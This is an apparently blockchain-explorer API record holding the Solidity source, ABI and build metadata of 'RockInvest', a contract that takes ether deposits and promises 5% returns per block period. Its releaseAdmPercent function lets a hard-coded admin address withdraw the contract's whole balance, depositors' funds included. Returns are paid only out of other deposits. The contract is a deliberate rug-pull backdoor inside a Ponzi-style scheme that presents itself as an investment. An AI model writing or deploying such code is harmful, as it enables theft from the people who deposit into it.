{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.25;\r\n \r\nlibrary SafeMath {\r\n  function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\r\n    if (_a == 0) {\r\n      return 0;\r\n    }\r\n    c = _a * _b;\r\n    assert(c / _a == _b);\r\n    return c;\r\n  }\r\n \r\n  function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\n    return _a / _b;\r\n  }\r\n \r\n  function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\n    assert(_b <= _a);\r\n    return _a - _b;\r\n  }\r\n \r\n  function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\r\n    c = _a + _b;\r\n    assert(c >= _a);\r\n    return c;\r\n  }\r\n}\r\n \r\n   \r\ncontract RockInvest {\r\n    using SafeMath for uint256;\r\n   \r\n   \r\n    address public constant admAddress = 0x35F55eBE0CAABaA7D0Ed7E6f4DbA414DF76EC4c4;\r\n    \r\n    mapping (address => uint256) deposited;\r\n    mapping (address => uint256) withdrew;\r\n    mapping (address => uint256) blocklock;\r\n \r\n    uint256 public totalDepositedWei = 0;\r\n    uint256 public totalWithdrewWei = 0;\r\n    modifier admPercent(){\r\n        require(msg.sender == admAddress);\r\n        _;\r\n    }\r\n \r\n    function() payable external {\r\n        if (deposited[msg.sender] != 0) {\r\n            address investor = msg.sender;\r\n            uint256 depositsPercents = deposited[msg.sender].mul(5).div(100).mul(block.number-blocklock[msg.sender]).div(5900);\r\n            investor.transfer(depositsPercents);\r\n \r\n            withdrew[msg.sender] += depositsPercents;\r\n            totalWithdrewWei = totalWithdrewWei.add(depositsPercents);\r\n\t\t\t\r\n\t\t\t\r\n        }\r\n \r\n       \r\n        blocklock[msg.sender] = block.number;\r\n        deposited[msg.sender] += msg.value;\r\n \r\n        totalDepositedWei = totalDepositedWei.add(msg.value);\r\n    }\r\n \r\n    function userDepositedWei(address _address) public view returns (uint256) {\r\n        return deposited[_address];\r\n    }\r\n \r\n    function userWithdrewWei(address _address) public view returns (uint256) {\r\n        return withdrew[_address];\r\n    }\r\n \r\n    function userDividendsWei(address _address) public view returns (uint256) {\r\n        return deposited[_address].mul(5).div(100).mul(block.number-blocklock[_address]).div(5900);\r\n    }\r\n   \r\n    function releaseAdmPercent() admPercent public {\r\n        uint256 toParticipants = this.balance;\r\n        admAddress.transfer(toParticipants);\r\n    }\r\n \r\n \r\n   \r\n    function bytesToAddress(bytes bys) private pure returns (address addr) {\r\n        assembly {\r\n            addr := mload(add(bys, 20))\r\n        }\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"admAddress\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"userDividendsWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalWithdrewWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"userDepositedWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"releaseAdmPercent\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalDepositedWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"userWithdrewWei\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"RockInvest","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://7e953532bc65ebc392b599e331d747cb47ee0c6614b4c13ba3cc59a098a92a79"}]}